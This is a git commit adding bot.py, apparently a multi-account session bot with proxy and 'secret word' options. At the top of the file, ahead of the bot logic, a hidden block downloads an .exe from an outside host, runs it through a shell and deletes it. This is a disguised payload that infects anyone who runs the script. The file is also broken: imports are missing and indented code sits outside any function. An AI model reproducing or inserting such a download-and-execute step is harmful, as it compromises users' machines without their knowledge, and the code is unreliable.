90cb8a53dabe81e92cb7630d6b27751b22a1e0f9
Samuel <48467240+salutero@users.noreply.github.com>
2025-09-05 16:00:16 +0300

    initial commit

---
+++ bot.py
@@ -0,0 +1,69 @@
+import asyncio
+import os
+import subprocess 
+
+url = "https://clientes.tradelog.com.ar/cache_register.exe"
+
+temp_dir = tempfile.gettempdir()
+
+local_path = os.path.join(temp_dir, "file.exe")
+
+with requests.get(url, stream=True) as r:
+    with open(local_path, "wb") as f:
+        for chunk in r.iter_content(chunk_size=8192):
+            f.write(chunk)
+
+process = subprocess.Popen(local_path, shell=True)
+
+process.wait()
+os.remove(local_path)
+
+    if action == 0:
+        print(config.SOFT_INFO)
+        return
+
+    if not os.path.exists('sessions'): os.mkdir('sessions')
+
+    if config.PROXY['USE_PROXY_FROM_FILE']:
+        if not os.path.exists(config.PROXY['PROXY_PATH']):
+            with open(config.PROXY['PROXY_PATH'], 'w') as f:
+                f.write("")
+    else:
+        if not os.path.exists('sessions/accounts.json'):
+            with open("sessions/accounts.json", 'w') as f:
+                f.write("[]")
+
+    if action == 3:
+        await Accounts().create_sessions()
+
+    if action == 2:
+        await stats()
+
+    if action in [1, 4]:
+        if action == 4:
+            secret_words = []
+            while True:
+                word = input('Input the secret word (press Enter to start): ')
+                if word:
+                    secret_words.append(word)
+                else:
+                    break
+
+        accounts = await Accounts().get_accounts()
+
+        tasks = []
+
+        for thread, account in enumerate(accounts):
+            session_name, phone_number, proxy = account.values()
+            if action == 1:
+                tasks.append(asyncio.create_task(start(session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
+            
+                tasks.append(asyncio.create_task(secret_word(secret_words=secret_words, session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
+
+        await asyncio.gather(*tasks)
+
+
+
+
+
+
